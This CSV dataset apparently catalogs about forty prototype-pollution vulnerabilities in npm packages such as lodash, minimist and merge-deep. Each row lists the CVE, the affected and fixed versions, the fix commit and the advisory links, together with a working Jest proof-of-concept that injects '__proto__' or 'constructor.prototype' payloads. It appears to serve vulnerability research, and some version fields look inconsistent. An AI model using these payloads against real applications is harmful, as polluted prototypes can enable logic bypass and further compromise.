Attack Type,CVE-ID,Package,Version,Fix Version,Exploit File Path,Exploit,Fixed Commit,Sink,Links
prototype-pollution,CVE-2021-25913,set-or-get,1.2.10,1.2.11,prototype-pollution/set-or-get_1.2.10,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25913

test(""prototype pollution in set-or-get"", () => {
  var SetOrGet = require(""set-or-get"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  SetOrGet(obj, ""__proto__"", {}).polluted = ""yes"";
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/IonicaBizau/set-or-get.js/commit/82ede5cccb2e8d13e4f62599203a4389f6d8e936,build/utils.js:391:28,https://security.snyk.io/vuln/SNYK-JS-SETORGET-1070806; https://github.com/advisories/GHSA-6rv4-4qv6-88g2
prototype-pollution,CVE-2020-7736,bmoor,0.8.11,0.8.12,prototype-pollution/bmoor_0.8.11,"//https://snyk.io/vuln/SNYK-JS-BMOOR-598664
test(""prototype pollution in bmoor"", () => {
  expect({}.polluted).toBe(undefined);

  const bmoor = require(""bmoor"");
  bmoor.set({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,src/core.js:194:18,https://security.snyk.io/vuln/SNYK-JS-BMOOR-598664; https://github.com/advisories/GHSA-h3rx-g5c9-8q4x
prototype-pollution,CVE-2021-23700,merge-deep2,3.0.5,n/a,prototype-pollution/merge-deep2_3.0.5,"//https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593
test(""prototype pollution in merge-deep2"", () => {
  const mergeDeep2 = require(""merge-deep2"");
  let obj = {};
  let malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  mergeDeep2({}, JSON.parse(malicious_payload), true);
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP2-1727593; https://github.com/advisories/GHSA-j28q-p8ww-cp87
prototype-pollution,CVE-2021-23432,mootools,1.5.2,n/a,prototype-pollution/mootools_1.5.2,"//https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536
test(""prototype pollution in mootools"", () => {
  require(""mootools"");

  expect({}.polluted).toBe(undefined);

  Object.merge({}, JSON.parse('{""__proto__"": {""polluted"": ""yes""}}'));

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/mootools-core-1.5.2-server.js:355:24,https://security.snyk.io/vuln/SNYK-JS-MOOTOOLS-1325536; https://github.com/advisories/GHSA-x6hx-7gh3-3q98
prototype-pollution,CVE-2020-28279,flattenizer,0.0.5,1.1.1,prototype-pollution/flattenizer_0.0.5,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28279
test(""prototype pollution in flattenizer"", () => {
  expect({}.polluted).toBe(undefined);

  const flattenizer = require(""flattenizer"");
  flattenizer.unflatten({ ""__proto__.polluted"": ""yes"" });

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/flattenizer.min.js:1:1550,https://security.snyk.io/vuln/SNYK-JS-FLATTENIZER-1054934; 
prototype-pollution,CVE-2020-7772,doc-path,2.0.0,2.3.0,prototype-pollution/doc-path_2.0.0,"//https://snyk.io/vuln/SNYK-JS-DOCPATH-1011952
test(""prototype pollution in doc-path"", () => {
  const path = require(""doc-path"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  path.setPath({}, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/mrodrig/doc-path/commit/3e2bb168cf303bffcd7fae5f8d05e5300c1541c7,src/path.js:54:27,https://security.snyk.io/vuln/SNYK-JS-DOCPATH-1011952; https://github.com/advisories/GHSA-gm8g-xhh8-rmwr
prototype-pollution,CVE-2018-16487,lodash,4.17.9,4.17.11,prototype-pollution/lodash_4.17.9,"//https://hackerone.com/reports/380873
test(""prototype pollution in lodash"", () => {
  const _ = require(""lodash"");
  let payload = JSON.parse(
    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
  );
  expect({}.polluted).toBe(undefined);
  _.merge({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/lodash/lodash/commit/90e6199a161b6445b01454517b40ef65ebecd2ad,lodash.js:2573:21,https://hackerone.com/reports/380873; https://security.snyk.io/vuln/SNYK-JS-LODASH-73638; https://github.com/advisories/GHSA-h726-x36v-rx45
prototype-pollution,CVE-2020-28273,set-in,1.0.0,2.0.1,prototype-pollution/set-in_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28273
test(""prototype pollution in set-in"", () => {
  const si = require(""set-in"");
  const obj = {};

  expect({}.polluted).toBe(undefined);

  si(obj, [""__proto__"", ""polluted""], ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/ahdinosaur/set-in/commit/e431effa00195a6f06b111e09733cd1445a91a88,index.js:41:17,https://security.snyk.io/vuln/SNYK-JS-SETIN-1048049; https://github.com/advisories/GHSA-qr4p-c9wr-phr6
prototype-pollution,,nested-property,0.0.5,3.0.0,prototype-pollution/nested-property_0.0.5,"//https://snyk.io/test/npm/nested-property/0.0.5

test(""prototype pollution in nested-property"", () => {
  const nestedProperty = require(""nested-property"");
  const object1 = {};
  expect({}.polluted).toBe(undefined);
  nestedProperty.set(object1, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/cosmosio/nested-property/commit/881cf37eb956641fc26011ff66a436eb603c89d1,index.js:95:27,https://security.snyk.io/vuln/SNYK-JS-NESTEDPROPERTY-1022154; 
prototype-pollution,CVE-2018-16486,defaults-deep,0.2.4,n/a,prototype-pollution/defaults-deep_0.2.4,"//https://hackerone.com/reports/380878
test(""prototype pollution in defaults-deep "", () => {
  const defaultsDeep = require(""defaults-deep"");

  let obj = {};

  expect({}.polluted).toBe(undefined);

  let payload = JSON.parse(
    '{""constructor"": {""prototype"": {""polluted"": ""yes""}}}'
  );
  defaultsDeep({}, payload);
  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:26:21,https://security.snyk.io/vuln/SNYK-JS-DEFAULTSDEEP-173661; https://github.com/advisories/GHSA-pjxw-22xf-6pwc
prototype-pollution,CVE-2020-7719,locutus,2.0.11,2.0.12,prototype-pollution/locutus_2.0.11,"//https://snyk.io/vuln/SNYK-JS-LOCUTUS-598675
test(""prototype pollution in locutus"", () => {
  try {
    polluted;
    expect(true).toBe(false);
  } catch (e) {
    expect(true).toBe(true);
  }

  const locutus = require(""locutus"");
  locutus.php.strings.parse_str(""__proto__[polluted]=yes"");

  expect(polluted).toBe(""yes"");
});
",n/a,,https://security.snyk.io/vuln/SNYK-JS-LOCUTUS-598675; https://github.com/advisories/GHSA-f98m-q3hr-p5wq
prototype-pollution,CVE-2021-23452,x-assign,0.1.4,n/a,prototype-pollution/x-assign_0.1.4,"//https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314
test(""prototype pollution in x-assign"", () => {
  const XAssign = require(""x-assign"");

  expect({}.polluted).toBe(undefined);

  const a = { red: ""apple"" };
  const b = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');
  const c = XAssign.assign(a, b);

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:34:20,https://security.snyk.io/vuln/SNYK-JS-XASSIGN-1759314; https://github.com/advisories/GHSA-4mvj-rq4v-2fxw
prototype-pollution,CVE-2018-3753,merge-objects,1.0.3,n/a,prototype-pollution/merge-objects_1.0.3,"//https://snyk.io/vuln/npm:merge-objects:20180415
test(""prototype pollution in merge-objects"", () => {
  const merge = require(""merge-objects"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  obj = {};

  expect({}.polluted).toBe(undefined);

  merge({}, JSON.parse(malicious_payload));
  expect({}.polluted).toBe(""yes"");
});
",n/a,merge-objects.js:20:20,https://security.snyk.io/vuln/npm:merge-objects:20180415; https://github.com/advisories/GHSA-fp82-2h99-3fpp
prototype-pollution,CVE-2020-7771,asciitable.js,1.0.2,1.0.3,prototype-pollution/asciitable.js_1.0.2,"//https://snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799
test(""Prototype pollution in asciitable.js"", () => {
  expect({}.polluted).toBe(undefined);

  const req = require(""asciitable.js"");
  const b = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  req({}, b);

  expect({}.polluted).toBe(""yes"");
});
",n/a,asciitable.umd.js:50:104,https://security.snyk.io/vuln/SNYK-JS-ASCIITABLEJS-1039799; https://github.com/advisories/GHSA-5pxj-mhwj-x5gv
prototype-pollution,CVE-2020-28499,merge,2.1.0,n/a,prototype-pollution/merge_2.1.0,"//https://snyk.io/vuln/SNYK-JS-MERGE-1042987

test(""prototype pollution in merge"", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""merge"");
  const payload2 = JSON.parse('{""x"": {""__proto__"":{""polluted"":""yes""}}}');
  let obj1 = { x: { y: 1 } };
  merge.recursive(obj1, payload2);

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/src/index.js:59:19,https://security.snyk.io/vuln/SNYK-JS-MERGE-1042987; https://github.com/advisories/GHSA-7wpw-2hjm-89gp
prototype-pollution,,objnest,5.0.0,5.1.0,prototype-pollution/objnest_5.0.0,"//https://github.com/okunishinishi/node-objnest/pull/6
test(""prototype pollution in objnest"", () => {
  const objnest = require(""objnest"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  objnest.expand({ ""__proto__.polluted"": ""yes"" });
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/okunishinishi/node-objnest/commit/c541e1a775b562d63402a14dac9f8cbc52b116d7,lib/objnest.js:44:35,https://security.snyk.io/vuln/SNYK-JS-OBJNEST-1041787; 
prototype-pollution,CVE-2021-25927,flat,5.0.0,2.0.2,prototype-pollution/flat_5.0.0,"//https://snyk.io/vuln/SNYK-JS-FLAT-596927
test(""prototype pollution in flat"", () => {
  var unflatten = require(""flat"").unflatten;

  expect({}.polluted).toBe(undefined);

  unflatten({
    ""__proto__.polluted"": ""yes"",
  });

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jessie-codes/safe-flat/commit/4b9b7db976bba8c968354f4315f5f9c219b7cbf3,index.js:145:21,https://security.snyk.io/vuln/SNYK-JS-FLAT-596927; https://github.com/advisories/GHSA-33rv-m2gp-mm2r
prototype-pollution,CVE-2021-25928,safe-obj,1.0.0,n/a,prototype-pollution/safe-obj_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25928

test(""prototype pollution in safeObj"", () => {
  var safeObj = require(""safe-obj"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  safeObj.expand(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/index.js:122:28,https://security.snyk.io/vuln/SNYK-JS-SAFEOBJ-1277111; https://github.com/advisories/GHSA-wpgh-hmv4-r3v5
prototype-pollution,CVE-2020-7751,pathval,1.1.0,1.1.1,prototype-pollution/pathval_1.1.0,"//https://snyk.io/vuln/SNYK-JS-PATHVAL-596926
test(""prototype pollution in pathval"", () => {
  var pathval = require(""pathval"");

  var obj = {};
  expect({}.polluted).toBe(undefined);

  pathval.setPathValue(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/chaijs/pathval/commit/7859e0e1ce4c2c67de897edce097ed31f80661d0,index.js:158:25,https://security.snyk.io/vuln/SNYK-JS-PATHVAL-596926; 
prototype-pollution,CVE-2021-23444,jointjs,3.4.0,3.4.2,prototype-pollution/jointjs_3.4.0,"//https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578
test(""prototype pollution in jointjs"", () => {
  expect({}.polluted).toBe(undefined);

  const jointjs = require(""jointjs"");
  jointjs.util.setByPath({}, [[""__proto__""], ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});

// jointjs.util.setByPath({}, 'proto/polluted', 'yes');
// jointjs.util.setByPath({}, ['proto', 'polluted'], 'yes');
// console.log(polluted); // ReferenceError: polluted is not defined
",https://github.com/clientIO/joint/commit/e5bf89efef6d5ea572d66870ffd86560de7830a8,dist/joint.min.js:8:103865,https://security.snyk.io/vuln/SNYK-JS-JOINTJS-1579578; https://github.com/advisories/GHSA-f3pp-32qc-36w4
prototype-pollution,CVE-2020-7765,@firebase/util,0.3.3,0.3.4,prototype-pollution/firebase-util_0.3.3-canary.c47ba31d0,"//https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324
test(""prototype pollution in @firebase/util"", () => {
  expect({}.polluted).toBe(undefined);

  const util = require(""@firebase/util"");
  var payload = JSON.parse('{""__proto__"": {""polluted"": ""yes""}}');

  const a = {
    nest: {
      number: 1,
      string: ""1"",
      object: { key: ""1"" },
      date: new Date(1),
      nest: {
        a: 1,
      },
    },
  };

  var result = util.deepExtend(a, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/firebase/firebase-js-sdk/commit/9cf727fcc3d049551b16ae0698ac33dc2fe45ada,util/src/deepCopy.ts:68:49,https://security.snyk.io/vuln/SNYK-JS-FIREBASEUTIL-1038324; https://github.com/advisories/GHSA-fpm5-vv97-jfwg
prototype-pollution,CVE-2020-7598,minimist,1.0.0,0.2.1,prototype-pollution/minimist_1.0.0,"//https://snyk.io/vuln/SNYK-JS-MINIMIST-559764
test(""prototype pollution in minimist"", () => {
  expect({}.polluted).toBe(undefined);

  require(""minimist"")(""--__proto__.polluted yes"".split("" ""));

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:189:16,https://security.snyk.io/vuln/SNYK-JS-MINIMIST-559764; https://github.com/advisories/GHSA-vh95-rmgr-6w4m
prototype-pollution,CVE-2021-25945,js-extend,0.0.1,n/a,prototype-pollution/js-extend_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25945
test(""prototype pollution in js-extend"", () => {
  expect({}.polluted).toBe(undefined);

  const jsExtend = require(""js-extend"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  jsExtend.extend({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",n/a,extend.js:17:23,https://security.snyk.io/vuln/SNYK-JS-JSEXTEND-1297101; https://github.com/advisories/GHSA-mh82-55cm-6gfh
prototype-pollution,CVE-2018-16472,cached-path-relative,1.0.1,1.0.2,prototype-pollution/cached-path-relative_1.0.1,"//https://hackerone.com/reports/390847
test(""prototype pollution in cached-path-relative"", () => {
  expect({}.polluted).toBe(undefined);

  var relative = require(""cached-path-relative"");
  relative(""__proto__"", ""polluted"");

  expect({}.polluted).not.toBe(undefined);
});
",https://github.com/ashaffer/cached-path-relative/commit/a43cffec84ed0e9eceecb43b534b6937a8028fc0,lib/index.js:39:19,https://security.snyk.io/vuln/SNYK-JS-CACHEDPATHRELATIVE-72573; https://github.com/advisories/GHSA-hc9w-4p87-j549
prototype-pollution,,ts-dot-prop,1.4.0,1.4.1,prototype-pollution/ts-dot-prop_1.4.0,"//https://hackerone.com/reports/980599
test(""prototype pollution in ts-dot-prop"", () => {
  const tsDot = require(""ts-dot-prop"");

  let obj = {};
  expect({}.polluted).toBe(undefined);

  tsDot.set(obj, ""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/justinlettau/ts-dot-prop/commit/816b887a669ab959c3c2f85c6563d33928f00f14#diff-f41e9d04a45c83f3b6f6e630f10117feR183,src/index.ts:72:21,https://security.snyk.io/vuln/SNYK-JS-TSDOTPROP-1024441; 
prototype-pollution,,@lyngs/merge,1.0.9,n/a,prototype-pollution/lyngs-merge_1.0.9,"//https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823
test(""prototype pollution in @lyngs/merge"", () => {
  const { merge } = require(""@lyngs/merge"");
  expect({}.polluted).toBe(undefined);
  merge({ dummy: 1 }, JSON.parse(`{""__proto__"":{""polluted"":""yes""}}`));
  expect({}.polluted).toBe(""yes"");
});
",n/a,merge/dist/index.js:2684:20,https://security.snyk.io/vuln/SNYK-JS-LYNGSMERGE-1069823; 
prototype-pollution,CVE-2021-25946,nconf-toml,0.0.1,n/a,prototype-pollution/nconf-toml_0.0.1,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25946

test(""prototype pollution in nconf-toml"", () => {
  expect({}.polluted).toBe(undefined);

  const nt = require(""nconf-toml"");
  const fs = require(""fs"");
  const path = require(""path"");

  nt.parse(fs.readFileSync(path.resolve(__dirname, ""./payload.toml""), ""utf-8""));

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/compiler.js:55:18,https://security.snyk.io/vuln/SNYK-JS-NCONFTOML-1296831; https://github.com/advisories/GHSA-hx7j-43w2-7rj7
prototype-pollution,CVE-2020-8147,utils-extend,1.0.8,n/a,prototype-pollution/utils-extend_1.0.8,"//https://hackerone.com/reports/801522

test(""prototype pollution in utils-extend"", () => {
  const { extend } = require(""utils-extend"");
  const payload = '{""__proto__"":{""polluted"":""yes""}}';
  obj = {};

  expect({}.polluted).toBe(undefined);

  const pollutionObject = JSON.parse(payload);
  extend({}, pollutionObject);

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:46:19,https://security.snyk.io/vuln/SNYK-JS-UTILSEXTEND-560385; https://github.com/advisories/GHSA-6pq3-928q-x6w6
prototype-pollution,CVE-2020-28280,predefine,0.1.2,n/a,prototype-pollution/predefine_0.1.2,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28280
test(""prototype pollution in predefine"", () => {
  expect({}.polluted).toBe(undefined);

  var predefine = require(""predefine"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  predefine.merge({}, payload);

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:284:21,https://security.snyk.io/vuln/SNYK-JS-PREDEFINE-1054935; https://github.com/advisories/GHSA-mx3x-ghqm-r43h
prototype-pollution,CVE-2020-28283,libnested,1.5.0,1.5.1,prototype-pollution/libnested_1.5.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28283
test(""prototype pollution in libnested"", () => {
  expect({}.polluted).toBe(undefined);

  const libnested = require(""libnested"");
  libnested.set({}, [""__proto__"", ""polluted""], ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/dominictarr/libnested/commit/9619863a319ed1e5c19ddcbdbe3312f9cef72760,index.js:27:20,https://security.snyk.io/vuln/SNYK-JS-LIBNESTED-1054930; https://github.com/advisories/GHSA-3r9x-mjrm-2725
prototype-pollution,CVE-2021-25943,101,1.0.0,n/a,prototype-pollution/101_1.0.0,"test(""prototype pollution in 101/set"", () => {
  expect({}.polluted).toBe(undefined);

  const _101 = require(""101/set"");
  // console.log(_101)
  _101({}, ""__proto__.polluted"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:32:16,https://github.com/advisories/GHSA-cwcx-rxgc-cmw3; https://security.snyk.io/vuln/SNYK-JS-101-1292345
prototype-pollution,CVE-2019-10808,utilitify,1.0.2,1.0.3,prototype-pollution/utilitify_1.0.2,"//https://snyk.io/vuln/SNYK-JS-UTILITIFY-559497
test(""prototype pollution in utilitify"", () => {
  const { mergeDeep } = require(""utilitify"");
  var malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';

  expect({}.polluted).toBe(undefined);

  var result = mergeDeep(
    { a: { b: { c: ""c"", d: ""d"" } } },
    { a: { b: JSON.parse(malicious_payload) } }
  );

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/xcritical-software/utilitify/commit/88d6e27009823338bf319ffb768fe6b08e8ad2d1,utils/utils/mergeDeep.ts:17:18,https://security.snyk.io/vuln/SNYK-JS-UTILITIFY-559497; https://github.com/advisories/GHSA-9534-h433-2rjf
prototype-pollution,CVE-2020-7727,gedi,1.6.3,n/a,prototype-pollution/gedi_1.6.3,"//https://snyk.io/vuln/SNYK-JS-GEDI-598803
test(""prototype pollution in gedi"", () => {
  expect({}.polluted).toBe(undefined);

  const gedi = require(""gedi"");
  gedi().set(""[__proto__/polluted]"", ""yes"");

  expect({}.polluted).toBe(""yes"");
});
",n/a,gedi.js:393:32,https://security.snyk.io/vuln/SNYK-JS-GEDI-598803; https://github.com/advisories/GHSA-jh2m-j8pp-55rc
prototype-pollution,CVE-2020-7724,tiny-conf,1.1.0,n/a,prototype-pollution/tiny-conf_1.1.0,"//https://snyk.io/vuln/SNYK-JS-TINYCONF-598792
test(""prototype pollution in tinyConf"", () => {
  const tinyConf = require(""tiny-conf"");
  obj = {};

  expect({}.polluted).toBe(undefined);

  tinyConf.set(""__proto__.polluted"", ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",n/a,tiny-conf.js:73:17,https://security.snyk.io/vuln/SNYK-JS-TINYCONF-598792; https://github.com/advisories/GHSA-4q97-fh3f-j294
prototype-pollution,,sahmat,1.0.0,n/a,prototype-pollution/sahmat_1.0.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25916
test(""prototype pollution in sahmat"", () => {
  const sahmat = require(""sahmat"");
  let obj = { tmp: """" };

  expect({}.polluted).toBe(undefined);

  sahmat(obj, ""tmp"", (obj.__proto__.polluted = ""yes""));

  expect(obj.tmp.polluted).toBe(""yes"");
});
",n/a,build/utils.js:391:28,https://github.com/advisories/GHSA-83pq-466j-fc6j; 
prototype-pollution,CVE-2020-7718,gammautils,0.0.81,n/a,prototype-pollution/gammautils_0.0.81,"//https://snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670
test(""prototype pollution in gammautils"", () => {
  expect({}.polluted).toBe(undefined);

  const gammautils = require(""gammautils"");
  var payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  gammautils.object.deepMerge({}, payload);

  expect({}.polluted).toBe(""yes"");
});
",n/a,lib/objectUtils.js:146:34,https://security.snyk.io/vuln/SNYK-JS-GAMMAUTILS-598670; https://github.com/advisories/GHSA-pgmg-gf5p-54j8
prototype-pollution,CVE-2021-23509,json-ptr,1.1.0,3.0.0,prototype-pollution/json-ptr_1.1.0,"//https://snyk.io/vuln/SNYK-JS-JSONPTR-1016939
test(""prototype pollution in json-ptr"", () => {
  expect({}.polluted).toBe(undefined);

  const { JsonPointer } = require(""json-ptr"");
  JsonPointer.set({}, ""/constructor/prototype/polluted"", ""yes"", true);

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/flitbit/json-ptr/commit/5dc458fbad1c382a2e3ca6d62e66ede3d92849ca,index.js:277:26,https://security.snyk.io/vuln/SNYK-JS-JSONPTR-1577291; https://github.com/advisories/GHSA-8gwj-8hxc-285w
prototype-pollution,CVE-2021-23434,object-path,0.11.4,0.11.6,prototype-pollution/object-path_0.11.4,"//https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453
test(""prototype pollution in object-path"", () => {
  const objectPath = require(""object-path"");

  expect({}.polluted).toBe(undefined);
  objectPath.withInheritedProps.set({}, [[""__proto__""], ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/mariocasciaro/object-path/commit/7bdf4abefd102d16c163d633e8994ef154cab9eb,index.js:110:28,https://security.snyk.io/vuln/SNYK-JS-OBJECTPATH-1569453; https://github.com/advisories/GHSA-v39p-96qg-c8rf
prototype-pollution,CVE-2021-25914,object-collider,1.0.3,1.0.4,prototype-pollution/object-collider_1.0.3,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2021-25914

test(""prototype pollution in object-collider"", () => {
  var { collide } = require(""object-collider"");
  const payload = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  obj = {};

  expect({}.polluted).toBe(undefined);

  collide(obj, payload);
  expect({}.polluted).toBe(""yes"");
});
",https://github.com/FireBlinkLTD/object-collider/commit/321f75a7f8e7b3393e5b7dd6dd9ab26ede5906e5,src/utils/CollideUtil.ts:83:22,https://security.snyk.io/vuln/SNYK-JS-OBJECTCOLLIDER-1080739; https://github.com/advisories/GHSA-85g2-29m8-qf2p
prototype-pollution,CVE-2020-7700,phpjs,1.3.2,n/a,prototype-pollution/phpjs_1.3.2,"//https://snyk.io/vuln/SNYK-JS-PHPJS-598681

test(""prototype pollution in phpjs"", () => {
  expect({}.polluted).toBe(undefined);

  const p = require(""phpjs"");
  p.parse_str(""__proto__[polluted]=yes"", {});

  expect({}.polluted).toBe(""yes"");
});
",n/a,build/npm.js:6406:24,https://security.snyk.io/vuln/SNYK-JS-PHPJS-598681; https://github.com/advisories/GHSA-m428-jqc4-2p5j
prototype-pollution,CVE-2020-28272,keyget,2.2.0,2.3.0,prototype-pollution/keyget_2.2.0,"//https://www.whitesourcesoftware.com/vulnerability-database/CVE-2020-28272
test(""prototype pollution in keyget"", () => {
  var keyget = require(""keyget"");
  var obj = {};

  expect({}.polluted).toBe(undefined);

  keyget.set({}, ""__proto__.polluted"", ""yes"");
  expect(obj.polluted).toBe(""yes"");
});
",https://github.com/rumkin/keyget/commit/17d15b6c75036eb429075a8cfeccfc18094dd2e2,index.js:111:17,https://security.snyk.io/vuln/SNYK-JS-KEYGET-1048048; 
prototype-pollution,CVE-2021-26707,merge-deep,3.0.0,3.0.3,prototype-pollution/merge-deep_3.0.0,"// https://snyk.io/vuln/npm:merge-deep:20180215
test(""prototype pollution in merge-deep"", () => {
  expect({}.polluted).toBe(undefined);

  const merge = require(""merge-deep"");
  const malicious_payload = '{""__proto__"":{""polluted"":""yes""}}';
  merge({}, JSON.parse(malicious_payload));

  expect({}.polluted).toBe(""yes"");
});
",https://github.com/jonschlinkert/merge-deep/commit/e370968581413a2e5ffdbbf7c2f5094e0e0b3861,index.js:45:19,https://security.snyk.io/vuln/SNYK-JS-MERGEDEEP-1070277; https://github.com/advisories/GHSA-r6rj-9ch6-g264
prototype-pollution,CVE-2020-7774,y18n,3.2.1,5.0.5,prototype-pollution/y18n_3.2.1,"//https://snyk.io/test/npm/y18n/3.1.0

test(""prototype pollution in y18n"", () => {
  const y18n = require(""y18n"")();
  obj = {};

  expect({}.polluted).toBe(undefined);

  y18n.setLocale(""__proto__"");
  y18n.updateLocale({ polluted: ""yes"" }); //payload

  expect({}.polluted).toBe(""yes"");
});
",n/a,index.js:156:34,https://security.snyk.io/vuln/SNYK-JS-Y18N-1021887; https://github.com/advisories/GHSA-c4w7-xm78-47vh
prototype-pollution,CVE-2021-23402,record-like-deep-assign,1.0.1,n/a,prototype-pollution/record-like-deep-assign_1.0.1,"//https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024
test(""prototype pollution in x-assign"", () => {
  const deepAssign = require(""record-like-deep-assign"");

  expect({}.polluted).toBe(undefined);

  let obj = {};
  EVIL_JSON = JSON.parse('{""__proto__"":{""polluted"":""yes""}}');
  deepAssign({}, EVIL_JSON);

  expect({}.polluted).toBe(""yes"");
});
",n/a,src/mod.ts:34:9,https://security.snyk.io/vuln/SNYK-JS-RECORDLIKEDEEPASSIGN-1311024; https://github.com/advisories/GHSA-7qm6-9v49-38m9
prototype-pollution,CVE-2021-23820,json-pointer,0.6.1,n/a,prototype-pollution/json-pointer_0.6.1,"//https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-596925
test(""prototype pollution in json-pointer"", () => {
  const pointer = require(""json-pointer"");
  let obj = {};

  expect({}.polluted).toBe(undefined);

  pointer.set({}, [[""__proto__""], ""polluted""], ""yes"");
  expect({}.polluted).toBe(""yes"");
});
",N/A,index.js:98:18,https://security.snyk.io/vuln/SNYK-JS-JSONPOINTER-1577287; https://github.com/advisories/GHSA-v5vg-g7rq-363w
